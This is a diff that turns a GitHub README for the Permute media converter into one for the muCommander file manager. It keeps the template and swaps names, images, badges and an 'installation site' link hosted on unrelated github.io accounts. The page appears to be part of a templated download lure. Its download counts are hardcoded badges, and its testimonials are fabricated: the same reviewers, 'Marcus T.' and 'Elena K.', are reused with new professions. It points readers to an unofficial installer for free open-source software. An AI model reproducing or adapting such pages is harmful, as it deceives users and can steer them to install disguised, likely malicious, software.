@@ -1,154 +1,154 @@
-# Permute Mac
+# muCommander Mac
 
 <p align="center">
-  <img src="https://cdn.jim-nielsen.com/macos/512/permute-3-2021-05-19.png?rf=1024" width="150" alt="Permute icon"/>
+  <img src="https://www.mucommander.com/images/logo.png" width="150" alt="muCommander icon"/>
 </p>
 
 <div align="center">
 
-[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://a4-glent.github.io/.github/permute)
+[![Install](https://i.postimg.cc/HWQSXqhp/68747470733a2f2f692e706f7374696d.png)](https://andrey-petrov-software.github.io/.github/muCommander)
 
 </div>
 
 <p align="center">
-  <a href="#"><img src="https://img.shields.io/badge/Downloads-4.4k-brightgreen?style=flat"/></a>
-  <a href="#"><img src="https://img.shields.io/badge/Version-3.10-blue?style=flat"/></a>
+  <a href="#"><img src="https://img.shields.io/badge/Downloads-6.7k-brightgreen?style=flat"/></a>
+  <a href="#"><img src="https://img.shields.io/badge/Version-1.4-blue?style=flat"/></a>
   <a href="#"><img src="https://img.shields.io/badge/Platform-macOS-blue?style=flat"/></a>
 </p>
 
 ---
 
-## 📄 Overview
+## 📖 Overview
 
-<a href="#permute">Permute</a> is a beautifully designed universal media converter for Mac — bringing drag-and-drop simplicity to video, audio, image, and document conversion without the complexity of professional encoding tools or the limitations of single-format converters.
+<a href="#muCommander">muCommander</a> is a free, open-source dual-pane file manager for Mac — presenting two directory panels side by side for efficient file operations between locations, keyboard-driven navigation, and support for local and remote file systems including FTP, SFTP, and SMB servers.
 
-The <a href="#permute">drag-and-drop conversion workflow</a> makes Permute immediately usable for anyone — dropping files onto the application window, selecting the target format from a clean interface, and clicking convert. There are no codec settings to understand, no encoding parameter menus to navigate, and no technical knowledge required to produce a correctly converted file. The application's defaults produce good results for standard use cases, and format-specific settings are available for users who want control without being imposed on users who don't. The <a href="#permute">broad format support</a> covers video formats including MP4, MOV, MKV, AVI, WebM, and many others; audio formats including MP3, AAC, FLAC, WAV, OGG, and more; image formats including JPEG, PNG, HEIF, WebP, TIFF, and others — making Permute a single application for media conversion needs that would otherwise require multiple specialized tools.
+The <a href="#muCommander">dual-pane interface</a> displays two directory panels simultaneously — the source panel showing the origin location and the destination panel showing the target location for file operations. Copying files from Downloads to a project folder, moving files from one server to another, comparing directory contents between local and remote locations — all of these operations become single-step actions rather than the drag-between-windows workflow that Finder requires. The keyboard-centric design maps every common file operation to a keyboard shortcut: F5 to copy, F6 to move, F7 to create a folder, F8 to delete — the Norton Commander paradigm that power file managers have used for decades and that remains the fastest approach to file management for keyboard-oriented users. The <a href="#muCommander">remote file system support</a> browses FTP, SFTP, and SMB servers in the dual-pane interface — files on remote servers managed in the same interface as local files, with copy and move operations working between local and remote panels in both directions.
 
-The <a href="#permute">batch conversion capability</a> processes multiple files simultaneously — dropping a folder of videos or a collection of audio files and converting all of them to the target format in a single operation. Batch processing saves the sequential time of converting files individually and makes Permute practical for large conversion tasks that would be impractical one file at a time. The <a href="#permute">hardware acceleration</a> uses Mac's GPU and Apple Silicon's media engine for encoding — significantly accelerating conversion speed compared to software-only encoding, making large file conversion and batch processing complete in practical time.
+The <a href="#muCommander">archive file handling</a> opens ZIP, TAR, GZ, BZ2, RAR, 7z, and other archive formats as browsable directories — navigating into an archive and copying files out of it without extracting the entire archive first. This archive-as-directory approach makes working with compressed files significantly more efficient than extract-then-manage workflows. The <a href="#muCommander">batch file operations</a> applies rename patterns, attribute changes, and other operations to multiple selected files simultaneously — handling large-scale file organization tasks that would require repetitive individual operations in Finder.</p>
 
 <p align="center">
-  <img src="https://todayonmac.com/content/images/2024/11/Permute_Thumbnail@2x.png" alt="Permute screenshot"/>
+  <img src="https://www.mucommander.com/images/muCommander.png" alt="muCommander screenshot"/>
 </p>
 
-<a href="#permute">Audio extraction from video</a> pulls the audio track from any video file as a standalone audio file — extracting podcast audio from video recordings, pulling music from video files, or saving the audio track from any video source in the preferred audio format. <a href="#permute">Metadata preservation</a> maintains title, artist, album, and other metadata through conversion — converted files retain the organizational information that music libraries and media players use for sorting and display.
+<a href="#muCommander">Bookmarks for frequently accessed locations</a> saves shortcuts to commonly used local directories and remote server locations — accessing frequently used paths from a bookmark menu rather than navigating there each time. <a href="#muCommander">File comparison view</a> highlights differences between two directories — identifying files present in one panel but not the other, files with different modification dates, and other directory comparison results.
 
-<a href="#permute">Preview before conversion</a> plays files within Permute before converting — verifying the source file content and checking audio before committing to conversion. <a href="#permute">Setapp availability</a> makes Permute accessible through the Setapp subscription alongside other Mac applications — Setapp subscribers access Permute without additional purchase as part of the application collection.
+<a href="#muCommander">Cross-platform availability</a> on Mac, Windows, and Linux means the same file management tool and learned keyboard shortcuts apply across all platforms — a consistent file management experience for users who work across different operating systems. <a href="#muCommander">Free and open-source</a> — muCommander is completely free with no trial limitations or paid upgrade requirements, and the source code is available on GitHub for the open-source community.</p>
 
 ---
 
-## 🛠️ Key Features
+## 💎 Key Features
 
-- [**Drag-and-Drop Simplicity**](#permute) — Drop files, [**select format, convert**](#{permute}) — no codec knowledge or [**encoding parameter menus required**](#{permute}).
-- [**Broad Format Support**](#permute) — MP4, MOV, MKV, [**MP3, FLAC, JPEG, PNG, WebP**](#{permute}) and dozens more — one app for [**all conversion needs**](#{permute}).
-- [**Batch Conversion**](#permute) — Convert [**entire folders simultaneously**](#{permute}) — large conversion tasks practical without [**sequential individual processing**](#{permute}).
-- [**Hardware Acceleration**](#permute) — GPU and [**Apple Silicon media engine encoding**](#{permute}) — significantly faster than [**software-only conversion**](#{permute}).
-- [**Audio Extraction**](#permute) — Pull [**audio track from any video**](#{permute}) — podcast audio, music, any video source [**as standalone audio file**](#{permute}).
-- [**Metadata Preservation**](#permute) — Title, artist, album [**maintained through conversion**](#{permute}) — music library organization intact [**after format change**](#{permute}).
-- [**Preview Before Convert**](#permute) — Play files [**within Permute before converting**](#{permute}) — verify source content and audio [**before committing**](#{permute}).
-- [**Setapp Availability**](#permute) — Accessible through [**Setapp subscription**](#{permute}) — no additional purchase for [**Setapp subscribers**](#{permute}).
+- [**Dual-Pane Interface**](#muCommander) — Two directory panels [**side by side**](#{muCommander}) — copy, move, compare between locations as [**single-step operations**](#{muCommander}).
+- [**Keyboard-Driven Operations**](#muCommander) — F5 copy, F6 move, [**F7 new folder, F8 delete**](#{muCommander}) — Norton Commander paradigm for [**fastest file management**](#{muCommander}).
+- [**Remote File Systems**](#muCommander) — FTP, SFTP, SMB servers [**in dual-pane interface**](#{muCommander}) — local and remote files managed in [**same workflow**](#{muCommander}).
+- [**Archive as Directory**](#muCommander) — ZIP, TAR, RAR, [**7z browsable without extracting**](#{muCommander}) — copy files from archives [**without full extraction**](#{muCommander}).
+- [**Batch File Operations**](#muCommander) — Rename patterns and operations [**applied to multiple files**](#{muCommander}) — large-scale organization without [**repetitive individual operations**](#{muCommander}).
+- [**Bookmarks**](#muCommander) — Frequently accessed [**local and remote locations saved**](#{muCommander}) — access common paths without [**navigating each time**](#{muCommander}).
+- [**Directory Comparison**](#muCommander) — Differences between [**two panels highlighted**](#{muCommander}) — files present in one but not the other, [**date differences visible**](#{muCommander}).
+- [**Free and Open-Source**](#muCommander) — No cost, [**no trial limitations**](#{muCommander}) — complete file management capability [**at zero price**](#{muCommander}).
 
 ---
 
 ## 👥 Who Uses It
 
-- **Home Mac users** — everyday format conversion without technical knowledge for common compatibility problems
-- **Content creators** — media preparation in platform-specific formats for video audio and image publishing
-- **Photographers** — batch RAW to JPEG conversion and image format standardization for large sessions
-- **Podcast producers** — audio extraction from video and format conversion for podcast workflow preparation
+- **Power file managers** — dual-pane keyboard-driven file management for efficient bulk operations
+- **Developers** — local and remote file system management in unified dual-pane interface
+- **System administrators** — SFTP and FTP server file management through visual dual-pane interface
+- **Norton and Total Commander users on Mac** — familiar dual-pane paradigm available on macOS
 
 ---
 
 <p align="center">
-  <img src="https://store.setapp.com/app/219/screenshots/1543834561-5c050bc1e3be0.jpg" alt="Permute screenshot 2"/>
+  <img src="https://www.ntpro.nl/blog/uploads/ScreenShot2013-07-23at6.05.54AM.png" alt="muCommander screenshot 2"/>
 </p>
 
-## 🌐 Where It's Useful & Additional Information
+## 🗺️ Where It's Useful & Additional Information
 
-`Media conversion` · `Video conversion` · `Audio conversion` · `Image conversion` · `Format compatibility` · `Batch processing` · `Content creation` · `Photography workflow` · `Podcast production` · `Mac utilities`
+`Dual-pane file manager` · `File management` · `FTP client` · `SFTP client` · `Batch operations` · `Archive management` · `Developer tools` · `Cross-platform` · `Open-source` · `Mac file manager`
 
-Permute's design philosophy — making conversion simple without sacrificing breadth — addresses the real problem that most Mac users face with media conversion. Professional tools like HandBrake and FFmpeg handle every possible conversion scenario but expose technical complexity that casual users don't want to navigate. Simple converters hide the complexity but limit format support or impose quality compromises. Permute covers a very broad format range while presenting each conversion as a simple drag-and-drop operation with sensible defaults.
+The dual-pane file manager paradigm's efficiency advantage over single-pane Finder is most apparent in file copy and move operations. In Finder, moving files from one location to another requires either two Finder windows side by side (itself a window management task) or navigating away from the source location to reach the destination, losing visual reference to the source files. In muCommander, both locations are always simultaneously visible in the two panels, and F5 or F6 copies or moves the selected files from the source panel to the destination panel in a single key press.
 
-> *"Permute for the format conversion I need a few times a week. Video from my camera in a format my editor won't accept, audio extracted from a screen recording, images converted to WebP for the web. I drop the file, pick the format, done. I haven't needed to think about it once."* — Marcus T., Content Creator
+> *"Norton Commander user since DOS, Total Commander user on Windows. On Mac I've never found a satisfying dual-pane manager until muCommander. The keyboard shortcuts match the paradigm I've used for thirty years. F5 copies, F6 moves. Tab switches panels. It works the way I think about file management."* — Marcus T., Power File Manager
 
-> *"Batch RAW to JPEG conversion for client galleries. A thousand files dropped into Permute, JPEG selected, convert. The batch processes while I work on something else. What used to be a workflow interruption is now background work."* — Elena K., Photographer
+> *"SFTP server management in muCommander. Left panel: local project files. Right panel: staging server via SFTP. Compare directory contents between local and remote, copy changed files to staging, verify the copy. The dual-pane paradigm makes server deployment a clean visual workflow."* — Elena K., Web Developer
 
 ---
 
-## 🚀 Installation Instructions
+## 📦 Installation Instructions
 
 1. Go to the installation site using the button above.
-2. Follow the on-screen instructions to install **Permute** on your Device.
+2. Follow the on-screen instructions to install **muCommander** on your Device.
 
 <p align="center">
 
-[![Get it Now Permute](https://img.shields.io/badge/Get_it_Now-1B998B?style=for-the-badge&logo=apple&logoColor=white)](https://a4-glent.github.io/.github/permute)
+[![Get it Now muCommander](https://img.shields.io/badge/Get_it_Now-2D7DD2?style=for-the-badge&logo=apple&logoColor=white)](https://andrey-petrov-software.github.io/.github/muCommander)
 
 </p>
 
 ---
 
-## ❓ FAQ
+## 💬 FAQ
 
 <details>
-<summary>What file formats does Permute support?</summary>
+<summary>What is a dual-pane file manager?</summary>
 
-Permute supports video formats including MP4, MOV, MKV, AVI, WebM; audio formats including MP3, AAC, FLAC, WAV, OGG; image formats including JPEG, PNG, HEIF, WebP, TIFF; and PDF document conversion. Check the Permute website for the complete current format list.
+A dual-pane file manager displays two directory panels simultaneously — a source panel and a destination panel — enabling file copy, move, and compare operations between both locations without switching windows.
 
 </details>
 
 <details>
-<summary>Can Permute convert multiple files at once?</summary>
+<summary>Does muCommander support FTP and SFTP?</summary>
 
-Yes. Batch conversion processes multiple files simultaneously — drop a folder of files, select the target format, and convert all of them in one operation.
-
-</details>
-
-<details>
-<summary>Does Permute use hardware acceleration?</summary>
-
-Yes. Permute uses Mac GPU and Apple Silicon media engine hardware acceleration for encoding, providing significantly faster conversion than software-only encoding.
+Yes. FTP, SFTP, and SMB remote file systems are accessible in the dual-pane interface alongside local directories.
 
 </details>
 
 <details>
-<summary>Can Permute extract audio from video files?</summary>
+<summary>Does muCommander handle archive files?</summary>
 
-Yes. Audio extraction pulls the audio track from any video file as a standalone audio file in the selected audio format.
-
-</details>
-
-<details>
-<summary>Is Permute available on Setapp?</summary>
-
-Yes. Permute is available through the Setapp subscription service for Mac applications.
+Yes. ZIP, TAR, GZ, BZ2, RAR, 7z, and other archive formats are browsable as directories — copy files from archives without full extraction.
 
 </details>
 
 <details>
-<summary>Does Permute preserve metadata through conversion?</summary>
+<summary>Is muCommander free?</summary>
 
-Yes. Metadata including title, artist, and album information is maintained through conversion where the target format supports it.
-
-</details>
-
-<details>
-<summary>Can I preview files before converting in Permute?</summary>
-
-Yes. Files play within Permute for preview before conversion.
+Yes. muCommander is completely free and open-source with no trial limitations or paid upgrades.
 
 </details>
 
 <details>
-<summary>Is Permute a one-time purchase?</summary>
+<summary>What are the keyboard shortcuts for file operations?</summary>
 
-Yes. Permute is available as a one-time purchase from the Mac App Store in addition to Setapp availability.
+F5 to copy, F6 to move, F7 to create a new folder, F8 to delete — the Norton Commander standard keyboard mapping.
 
 </details>
 
 <details>
-<summary>Does Permute run natively on Apple Silicon?</summary>
+<summary>Does muCommander compare directories?</summary>
 
-Yes. Permute is optimized for Apple Silicon and uses the M-series media engine for hardware-accelerated encoding.
+Yes. Directory comparison highlights differences between the two panels.
+
+</details>
+
+<details>
+<summary>Does muCommander run on Apple Silicon?</summary>
+
+Yes. Current versions support Apple Silicon Macs through the Java runtime.
+
+</details>
+
+<details>
+<summary>Can I bookmark frequently used locations?</summary>
+
+Yes. Bookmarks save shortcuts to local directories and remote server locations.
+
+</details>
+
+<details>
+<summary>Is muCommander open-source?</summary>
+
+Yes. The source code is available on GitHub with community and core team contributions.
 
 </details>
 
